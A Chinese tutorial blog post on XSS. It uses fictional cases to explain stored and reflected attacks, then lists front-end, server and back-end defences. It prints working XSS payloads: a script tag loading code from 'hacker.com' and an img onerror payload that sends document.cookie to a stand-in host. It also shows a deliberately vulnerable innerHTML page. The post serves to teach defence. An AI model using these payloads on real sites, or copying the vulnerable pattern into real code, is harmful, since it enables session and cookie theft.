---
layout: post
title: WEB安全指北：XSS攻击
date: 2019-05-14
categories: blog
header-color: "#678"
tags: [js]
---

### 今日说法：XSS 攻击案例（一）

以下案例纯属虚构：

黑客发现旧浪网某边缘功能的评论区存在漏洞，用户输入的内容未经过滤直接保存到后台

攻击者构建一个评论, 包含恶意内容

    你的牌打得太好辣！<script src="//hacker.com/evil.js"></script>

用户访问评论列表时，服务端取出存储的内容，回填到 HTML 响应中：

```html
<li>
  你的牌打得太好辣！<script src="//hacker.com/evil.js"></script>
</li>
```

浏览器接收到响应后就会加载执行恶意脚本 hacker.com/evil.js，在恶意脚本中利用用户的登录状态进行关注、发微博、发私信等操作，发出的微博和私信可再带上恶意评论的 URL，诱导更多人点击，层层放大攻击范围。

### 今日说法：XSS 攻击案例（二）

程序员杨天宝开发了一个页面，用于展示用户输入的数据：

[dev.cabeza.cn/security/xss.html?a=坤坤](http://dev.cabeza.cn/security/xss.html?a=坤坤)

看起来没什么问题 😀

某日，杨天宝接到了自己页面的地址，虽然有点长:

<a href="http://dev.cabeza.cn/security/xss.html?a=%3Cimg%20src=%22%22%20onerror=%22javascript:alert(%27NM$L%27)%22%3E">dev.cabeza.cn/security/xss.html?a=%3Cimg%20src=%22%22%20onerror=%22javascript:alert(%27NM\$L%27)%22%3E</a>

点开后，页面弹出了写着粗鄙之语的弹出框

杨天宝又接到了一串神秘网址：

[dev.cabeza.cn/security/xss.html?a=%3Cimg%20src=%22%22%20onerror=%22document.body.appendChild(document.createElement(%27img%27)).setAttribute(%27src%27%2C%27http%3A%2F%2Fwww.xxx.com%2Fcookie%3Fc%3D%27%2Bdocument.cookie)%3B%22%3E](<http://dev.cabeza.cn/security/xss.html?a=%3Cimg%20src=%22%22%20onerror=%22document.body.appendChild(document.createElement(%27img%27)).setAttribute(%27src%27%2C%27http%3A%2F%2Fwww.xxx.com%2Fcookie%3Fc%3D%27%2Bdocument.cookie)%3B%22%3E>)

`注：该页面已经提前埋下了值为'password=ikun'的测试性cookie`

这时如果你打开浏览器的控制台，在 NETWORK 监控里就会发现已经朝http://www.xxx.com/cookie这个地址发送了请求，并且携带了自己的cookie

    http://www.xxx.com/cookie?c=password=ikun

想想攻击者拿到用户 cookie 意味着什么，杨天宝已经倒吸一口凉气了

### 案情分析

这是杨天宝开发的页面内容：

```html
<html lang="en">
  <head></head>
  <body>
    <div id="test"></div>
    <h1>我喜欢唱跳rap还有篮球</h1>
  </body>
  <script>
    // 从url参数中取值
    let a = getQueryString("a");
    document.querySelector("#test").innerHTML = a;
  </script>
</html>
```

杨天宝过分信任用户的输入，没有做任何防范。

上面的例子中，黑客的攻击语句分别为

    <img src="" onerror="javascript:alert('NM$L')">

    <img src="" onerror="document.body.appendChild(document.createElement('img')).setAttribute('src','http://www.xxx.com/cookie?c='+document.cookie);">

当这些恶意语句没有经过过滤注入到页面 HTML 中时，其中的 js 代码便会执行，实现达到窃取用户信息的目的

**这就是 XSS 攻击**

### XSS 的定义

Cross-Site Scripting（跨站脚本攻击）简称 XSS，是一种代码注入攻击。攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全。

为了不和层叠样式表（Cascading Style Sheets, CSS）的缩写混淆，故将跨站脚本攻击缩写为 XSS

### XSS 的分类

根据攻击手段的不同，xss 可以分为

- 存储型 XSS
- 反射型 XSS

#### 存储型

上文中的旧浪网案例，便是一个存储型XSS攻击

这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。具有攻击性的脚本被保存到了服务器并且可以被普通用户完整的从服务的取得并执行，从而获得了在网络上传播的能力。

其原因是数据提交到后端没有进行过滤直接持久化，其他用户浏览到这段评论时执行了恶意脚本

如果攻击者的脚本是删除文章、发布反动内容, 那么后果将非常严重了

#### 反射型

上文案例中黑客攻击杨天宝的网站所用手段，便是一个典型的反射型 XSS 攻击，利用系统漏洞，构造出包含恶意代码的特殊 URL，并欺骗用户去点击访问，从而触发恶意脚本发起 Web 攻击

反射型 XSS 跟存储型 XSS 的区别是：存储型 XSS 的恶意代码存在数据库里，反射型 XSS 的恶意代码存在 URL 里。反射型 XSS 漏洞常见于通过 URL 传递参数的功能，如网站搜索、跳转等。由于需要用户主动打开恶意的 URL 才能生效，攻击者往往会结合多种手段诱导用户点击。

### XSS 的防御

#### 前端层面

- 输入内容控制长度
- 输入过滤
- 谨慎使用 innerHTML、document.write()等
- vue 框架中，谨慎使用 v-html
- react 框架中，谨慎使用 dangerouslySetInnerHTML

#### 服务器

- 各种 Web Application Firewall，比如 nginx lua waf
- 设置 HTTP 的 Content-Security-Policy 头部字段

[lua waf](https://github.com/p0pr0ck5/lua-resty-waf/blob/master/rules/42000_xss.json)

[Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

#### 后端

- 对于一切用户的输入、输出、客户端的输出内容视为不可信，对于前端传来的 HTML 务必进行转义
- cookie 设置为 http-only
- 敏感操作加入前置校验（验证码等）

[转义库 owasp](https://www.owasp.org/index.php/OWASP_Java_Encoder_Project#tab=Use_the_Java_Encoder_Project)

### 总结

程序开发过程中

1. 始终认为用户是愚蠢的

2. 始终认为用户是恶意的

3. 攻防无止境
